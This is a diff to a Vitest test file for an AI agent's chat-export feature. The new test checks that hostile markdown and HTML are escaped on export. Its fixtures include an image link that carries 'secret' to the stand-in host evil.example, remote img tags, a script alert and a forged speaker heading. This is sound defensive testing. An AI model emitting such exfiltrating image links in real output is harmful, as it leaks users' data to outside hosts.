@@ -4,10 +4,11 @@
 import { mkdtempSync, rmSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import path from 'node:path';
-import { afterEach, describe, expect, test } from 'vitest';
+import { afterEach, describe, expect, test, vi } from 'vitest';
 import { CHAT_EXPORT_FORMAT_VERSION, CHAT_EXPORT_JSON_KIND, CHAT_EXPORT_UNTRUSTED_NOTE, chatExportFileName } from '@app/specs/agent-data.spec';
 import { chatExportObject, chatExportText, chatMarkdown } from '../chat-export';
-import type { ChatSnapshot } from '../chat-record';
+import { createMemoryChatsStore } from '../chat-history';
+import { encodeChat, type ChatSnapshot } from '../chat-record';
 import { createMemoryGrantsStore } from '../grants';
 import { createAgentServiceFrom, type AgentDialogs } from '../service';
 import { createFakeChannel, createFakeFork, createFakeSafeStorage, type FakePort } from './fakes';
@@ -90,6 +91,44 @@ describe('chat export', () => {
     expect(chatExportText(CHAT, 'markdown', EXPORTED_AT)).toBe(GOLDEN_MARKDOWN);
     // A tool output can't close its block early: the fence is longer than any backtick run in it.
     expect(GOLDEN_MARKDOWN).toContain('````tool page_text');
+  });
+
+  test('export-markdown-hostile-text-is-inert', () => {
+    const hostile: ChatSnapshot = {
+      ...CHAT,
+      title: '<img src=x> [click](https://evil.example/)',
+      entries: [
+        { kind: 'user', text: 'Summarise <script>alert(1)</script>', tools: [] },
+        {
+          kind: 'assistant',
+          text: 'Done ![](https://evil.example/?d=secret)\n# You\n<img src="https://evil.example/p.png">\n```\nhidden\n```\n[ref]: https://evil.example/r \\!',
+          tools: [],
+        },
+      ],
+    };
+    expect(chatMarkdown(hostile, EXPORTED_AT)).toBe(`# \\<img src=x\\> \\[click\\](https://evil.example/)
+
+Exported from frost on 2026-10-28T12:00:00.000Z. Last updated 2026-10-28T11:59:00.000Z. Model: anthropic/claude-sonnet-5-5.
+
+> ${CHAT_EXPORT_UNTRUSTED_NOTE}
+
+## You
+
+Summarise \\<script\\>alert(1)\\</script\\>
+
+## Agent
+
+Done \\!\\[\\](https://evil.example/?d=secret)
+\\# You
+\\<img src="https://evil.example/p.png"\\>
+\\\`\\\`\\\`
+hidden
+\\\`\\\`\\\`
+\\[ref\\]: https://evil.example/r \\\\\\!
+`);
+    // No image, link, HTML tag or code fence can open: every opener is escaped.
+    const text = chatMarkdown(hostile, EXPORTED_AT);
+    expect(text).not.toMatch(/(^|[^\\])!\[|(^|[^\\])<[a-z/]|(^|[^\\])\[|^```|^#\s*You$/m);
   });
 
   test('export-json-golden', () => {
@@ -175,6 +214,7 @@ describe('chat export', () => {
     let answer: string | null = null;
     const dialogs: AgentDialogs = {
       confirmDeleteAllChats: async () => false,
+      confirmRetentionChange: async () => false,
       chooseExportPath: async (name, format) => {
         asked.push([name, format]);
         return answer;
@@ -200,7 +240,7 @@ describe('chat export', () => {
       },
       browser: { getState: () => ({ activeTabId: null, tabs: [] }) } as never,
       webContents: {} as never,
-      sessionStore: { agentGrants: createMemoryGrantsStore() },
+      sessionStore: { agentGrants: createMemoryGrantsStore(), agentChats: createMemoryChatsStore({ chats: [encodeChat(CHAT)] }) },
       buildDir: userData,
       dialogs,
       writeExport: async (file, text) => {
@@ -211,7 +251,8 @@ describe('chat export', () => {
       setInterval: () => 0,
       clearInterval: () => undefined,
     });
-    service.restore([CHAT]);
+    // The stored chat is listed at startup; its messages are read when it is exported.
+    await vi.waitFor(() => expect(service.getState().chats.map((chat) => chat.id)).toEqual([CHAT.id]));
     // Cancelled: nothing written.
     expect(await service.exportChat(CHAT.id, 'markdown')).toBe('cancelled');
     expect(asked).toEqual([['frost-chat-2026-10-28.md', 'markdown']]);
@@ -223,12 +264,21 @@ describe('chat export', () => {
     expect(writes).toHaveLength(1);
     expect(writes[0]![0]).toBe(chosen);
     expect(JSON.parse(writes[0]![1])).toMatchObject({ kind: CHAT_EXPORT_JSON_KIND, chat: { title: CHAT.title } });
+    expect((JSON.parse(writes[0]![1]) as { chat: { messages: unknown[] } }).chat.messages).toHaveLength(CHAT.entries.length);
     // A failed write answers failed; an unknown chat never opens the dialog.
     failWrite = true;
     expect(await service.exportChat(CHAT.id, 'markdown')).toBe('failed');
     const before = asked.length;
     expect(await service.exportChat('00000000-0000-4000-8000-00000000ffff', 'markdown')).toBe('failed');
     expect(asked).toHaveLength(before);
+    // One save dialog at a time: an export asked for while one is open writes nothing.
+    failWrite = false;
+    let release: (file: string | null) => void = () => undefined;
+    dialogs.chooseExportPath = () => new Promise((resolve) => (release = resolve));
+    const first = service.exportChat(CHAT.id, 'markdown');
+    expect(await service.exportChat(CHAT.id, 'json')).toBe('cancelled');
+    release(chosen);
+    expect(await first).toBe('saved');
     service.dispose();
   });
 });
